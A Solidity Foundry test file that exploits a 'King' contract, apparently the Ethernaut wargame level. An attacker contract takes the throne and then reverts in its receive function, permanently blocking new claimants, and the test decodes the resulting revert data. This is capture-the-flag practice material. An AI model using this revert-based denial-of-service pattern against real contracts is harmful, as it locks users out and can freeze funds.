// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {King} from "../src/9.King.sol";
import {BytesLib} from "../src/library/bytes.sol";

string constant hackRevert = "HaHaHa";
contract Hack {
  bool startHack;
  function hack(address payable king) external payable {
     king.call{value:msg.value}("");
     startHack = true;
     console.log("===start hack===");
  }

  receive() external payable {
    if(startHack){
      console.log("Hack revert msg.sender", msg.sender,tx.origin, msg.value);
      revert(hackRevert);
    }
  }
}



contract KingHackTest is Test {
   using BytesLib for bytes;
   address payable king;
 
   address payable hackContract;

   address alice = vm.addr(1);
   address bob = vm.addr(2);
   address user = vm.addr(3);

   
   function setUp() public {
      alice.call{value:100}("");
      bob.call{value:200}("");
      user.call{value:9999}("");
      vm.prank(address(0));
      king = payable(address(new King()));
   }
   function hack() external payable {
      hackContract = payable(address(new Hack()));
      Hack(hackContract).hack{value: msg.value}(king);
   }

   function testKingHack() public {
    
      vm.prank(alice);
      (bool aliceSuccess,) = king.call{value:100}("");
      assertEq(aliceSuccess, true);
      assertEq(address(0).balance, 100);
      assertEq(King(king)._king(), alice);
     
      vm.prank(bob);
      (bool bobSuccess,) = king.call{value:200}("");
      assertEq(bobSuccess, true);
      assertEq(alice.balance, 200);
      assertEq(King(king)._king(), bob);

      // startHack
      this.hack{value:300}();
      assertEq(bob.balance, 300);
      assertEq(King(king)._king(), hackContract);


      // user call king. tx must failed.
      vm.startPrank(user);
      (bool success,bytes memory res) = king.call{value:400}("");
      assertEq(success, false);
      console.log("====res====");
      console.logBytes(res);
      console.log("res length:", res.length);
      console.logBytes(res.slice(0,4));
      console.logBytes(res.slice(4,32));
      console.logBytes(res.slice(36,32));
      console.logBytes(res.slice(68,32));
     
     
      console.log("res bytes 2 string",string(res.slice(4,96)));
      console.logBytes(bytes(hackRevert)); 
   }
}

// custom error response: 
// https://docs.soliditylang.org/en/v0.8.17/control-structures.html#panic-via-assert-and-error-via-require
// 
// 0x08c379a0    keccak256(Error(string));                            // Function selector for Error(string)
// 0x0000000000000000000000000000000000000000000000000000000000000020 // Data offset
// 0x000000000000000000000000000000000000000000000000000000000000001a // String length
// 0x4e6f7420656e6f7567682045746865722070726f76696465642e000000000000 // String data